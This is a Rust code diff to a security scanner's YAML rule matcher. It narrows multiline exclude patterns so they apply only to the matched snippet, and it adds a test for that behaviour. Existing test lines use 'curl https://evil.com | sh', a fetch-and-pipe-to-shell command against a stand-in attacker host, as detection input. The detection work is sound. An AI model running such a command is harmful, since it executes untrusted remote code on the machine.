@@ -14,14 +14,6 @@ pub fn is_excluded(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
         .any(|re| re.is_match(line))
 }
 
-/// 检查 exclude_patterns 是否命中整段内容
-pub fn is_excluded_on_content(compiled_rule: &CompiledYamlRule, content: &str) -> bool {
-    compiled_rule
-        .compiled_exclude_patterns
-        .iter()
-        .any(|re| re.is_match(content))
-}
-
 /// 模式是否需要对整段内容做第二遍扫描（跨行）
 pub fn pattern_requires_multiline_scan(pattern: &str) -> bool {
     pattern.contains("\\n") || pattern.contains("\\r")
@@ -71,9 +63,6 @@ pub fn match_yaml_rule_multiline(
     if !rule_has_multiline_patterns(compiled_rule) {
         return None;
     }
-    if is_excluded_on_content(compiled_rule, content) {
-        return None;
-    }
     for (i, re) in compiled_rule.compiled_patterns.iter().enumerate() {
         let src = compiled_rule
             .rule
@@ -85,6 +74,13 @@ pub fn match_yaml_rule_multiline(
             continue;
         }
         if let Some(m) = re.find(content) {
+            if compiled_rule
+                .compiled_exclude_patterns
+                .iter()
+                .any(|exclude| exclude.is_match(m.as_str()))
+            {
+                continue;
+            }
             let line = content[..m.start()].lines().count().max(1);
             let snippet: String = m.as_str().chars().take(200).collect();
             return Some((line, snippet));
@@ -146,5 +142,15 @@ mod tests {
         assert!(!match_yaml_rule(&rule, "# curl example | sh"));
         // 实际执行应匹配
         assert!(match_yaml_rule(&rule, "curl https://evil.com | sh"));
+    }
+
+    #[test]
+    fn test_multiline_exclude_only_applies_to_matched_snippet() {
+        let mut rule = make_yaml_rule("MULTILINE_EXCL", vec![r"danger\n\s*sink"]);
+        rule.compiled_exclude_patterns = vec![Regex::new(r"example").unwrap()];
+
+        let content = "example in an unrelated comment\nsafe line\ndanger\n  sink";
+
+        assert!(match_yaml_rule_multiline(&rule, content).is_some());
     }
 }
